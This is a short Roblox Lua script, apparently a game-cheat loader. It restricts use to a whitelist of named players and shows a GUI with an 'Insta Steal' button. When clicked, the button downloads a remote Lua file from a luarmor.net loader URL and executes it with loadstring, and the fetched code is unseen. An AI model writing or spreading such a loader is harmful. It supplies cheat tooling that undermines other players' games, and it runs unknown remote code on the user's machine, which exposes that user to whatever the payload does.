local LP = game:GetService("Players").LocalPlayer
local wl = {"Ilaykingo18", "Ilaykingo18acc4", "h0cker767"}
local ok = false

for _, v in pairs(wl) do 
    if LP.Name == v then ok = true break end 
end

if not ok then 
    LP:Kick("Kein Zugriff: Du stehst nicht auf der Whitelist!") 
    return 
end

local sg = Instance.new("ScreenGui", LP.PlayerGui)
sg.Name = "IlaysScript"

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 320, 0, 160)
main.Position = UDim2.new(0.5, -160, 0.5, -80)
main.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
main.Active = true
main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 15)

local stroke = Instance.new("UIStroke", main)
stroke.Thickness = 3
stroke.Color = Color3.fromRGB(0, 130, 255)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(0.8, 0, 0.3, 0)
title.Position = UDim2.new(0.1, 0, 0.05, 0)
title.BackgroundTransparency = 1
title.Text = "❄️ ILAY'S SCRIPT"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 22
title.Font = Enum.Font.GothamBold

local btn = Instance.new("TextButton", main)
btn.Size = UDim2.new(0.85, 0, 0.45, 0)
btn.Position = UDim2.new(0.075, 0, 0.45, 0)
btn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
btn.Text = "⚔️ Insta Steal"
btn.TextColor3 = Color3.fromRGB(80, 170, 255)
btn.TextSize = 24
btn.Font = Enum.Font.GothamBold
Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)

btn.MouseButton1Click:Connect(function()
    sg:Destroy()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/76b1779d41784f4cfe496bedfb0f513c.lua"))()
end)

local close = Instance.new("TextButton", main)
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(0.88, 0, 0.05, 0)
close.BackgroundTransparency = 1
close.Text = "❌"
close.TextColor3 = Color3.new(1,0,0)
close.MouseButton1Click:Connect(function() sg:Destroy() end)
